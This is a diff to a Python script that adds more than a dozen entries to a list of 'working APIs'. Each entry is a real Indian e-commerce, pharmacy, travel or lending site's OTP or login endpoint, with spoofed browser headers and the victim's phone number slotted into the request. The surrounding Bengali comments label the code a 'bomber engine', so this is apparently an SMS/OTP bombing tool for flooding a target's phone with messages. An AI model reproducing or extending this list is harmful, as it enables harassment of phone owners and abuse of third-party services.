@@ -644,6 +644,178 @@ def get_working_apis():
             "headers": {"Content-Type": "application/json"},
             "data": lambda phone: f'{{"mobile":"{phone}","resend":true}}'
         },
+        # ========== নতুন API (GitHub ক্লাস থেকে) ==========
+{
+    "name": "Flipkart (Alt)",
+    "url": "https://rome.api.flipkart.com/api/7/user/otp/generate",
+    "method": "POST",
+    "headers": {
+        "Content-Type": "application/json",
+        "Accept": "*/*",
+        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
+        "Origin": "https://www.flipkart.com",
+        "Referer": "https://www.flipkart.com/",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    },
+    "data": lambda phone: f'{{"loginId":"+91{phone}"}}'
+},
+{
+    "name": "ConfirmTKT",
+    "url": lambda phone: f"https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={phone}&newOtp=true",
+    "method": "GET",
+    "headers": {
+        "Accept": "*/*",
+        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
+        "Origin": "https://www.confirmtkt.com",
+        "Referer": "https://www.confirmtkt.com/rbooking-d/trips",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    },
+    "data": None
+},
+{
+    "name": "Lenskart (Alt)",
+    "url": "https://api.lenskart.com/v2/customers/sendOtp",
+    "method": "POST",
+    "headers": {
+        "Content-Type": "application/json;charset=UTF-8",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
+        "Origin": "https://www.lenskart.com",
+        "Referer": "https://www.lenskart.com/",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    },
+    "data": lambda phone: f'{{"telephone":"{phone}"}}'
+},
+{
+    "name": "JustDial",
+    "url": "https://www.justdial.com/functions/whatsappverification.php",
+    "method": "POST",
+    "headers": {
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "Accept": "*/*",
+        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
+        "Origin": "https://www.justdial.com",
+        "Referer": "https://www.justdial.com/",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "X-Requested-With": "XMLHttpRequest"
+    },
+    "data": lambda phone: f"mob={phone}&vcode=&rsend=0&name=deV"
+},
+{
+    "name": "IndiaLends",
+    "url": "https://indialends.com/internal/a/otp.ashx",
+    "method": "POST",
+    "headers": {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Accept": "*/*",
+        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
+        "Origin": "https://www.indialends.com",
+        "Referer": "https://www.indialends.com/",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "X-Requested-With": "XMLHttpRequest"
+    },
+    "data": lambda phone: f"log_mode=1&ctrl={phone}"
+},
+{
+    "name": "Apollo Pharmacy",
+    "url": "https://www.apollopharmacy.in/sociallogin/mobile/sendotp",
+    "method": "POST",
+    "headers": {
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "Accept": "*/*",
+        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
+        "Origin": "https://www.apollopharmacy.in",
+        "Referer": "https://www.apollopharmacy.in/",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "X-Requested-With": "XMLHttpRequest"
+    },
+    "data": lambda phone: f"mobile={phone}"
+},
+{
+    "name": "MagicBricks",
+    "url": "https://accounts.magicbricks.com/userauth/api/validate-mobile",
+    "method": "POST",
+    "headers": {
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "Accept": "application/json, text/javascript, */*; q=0.01",
+        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
+        "Origin": "https://accounts.magicbricks.com",
+        "Referer": "https://accounts.magicbricks.com/userauth/login",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "X-Requested-With": "XMLHttpRequest"
+    },
+    "data": lambda phone: f"ubimobile={phone}"
+},
+{
+    "name": "Ajio",
+    "url": "https://login.web.ajio.com/api/auth/generateLoginOTP",
+    "method": "POST",
+    "headers": {
+        "Content-Type": "application/json",
+        "Accept": "application/json",
+        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
+        "Origin": "https://www.ajio.com",
+        "Referer": "https://www.ajio.com/",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    },
+    "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'
+},
+{
+    "name": "MylesCars",
+    "url": "https://www.mylescars.com/usermanagements/chkContact",
+    "method": "POST",
+    "headers": {
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "Accept": "application/json",
+        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
+        "Origin": "https://www.mylescars.com",
+        "Referer": "https://www.mylescars.com/",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "X-Requested-With": "XMLHttpRequest"
+    },
+    "data": lambda phone: f"contactNo={phone}"
+},
+{
+    "name": "Unacademy",
+    "url": "https://unacademy.com/api/v1/user/get_app_link/",
+    "method": "POST",
+    "headers": {
+        "Content-Type": "application/json",
+        "Accept": "application/json",
+        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
+        "Origin": "https://unacademy.com",
+        "Referer": "https://unacademy.com",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    },
+    "data": lambda phone: f'{{"phone":"{phone}"}}'
+},
+{
+    "name": "Snapdeal",
+    "url": "https://www.snapdeal.com/sendOTP",
+    "method": "POST",
+    "headers": {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Accept": "*/*",
+        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
+        "Origin": "https://www.snapdeal.com",
+        "Referer": "https://www.snapdeal.com/iframeLogin",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "X-Requested-With": "XMLHttpRequest"
+    },
+    "data": lambda phone: f"emailId=&mobileNumber={phone}&purpose=LOGIN_WITH_MOBILE_OTP"
+},
+{
+    "name": "JioMart (Alt)",
+    "url": lambda phone: f"https://www.jiomart.com/mst/rest/v1/id/details/{phone}",
+    "method": "GET",
+    "headers": {
+        "Accept": "application/json, text/plain,*/*",
+        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
+        "Referer": "https://www.jiomart.com/customer/account/login",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    },
+    "data": None
+}
     ]
 
 # ========== বোম্বার ইঞ্জিন ==========
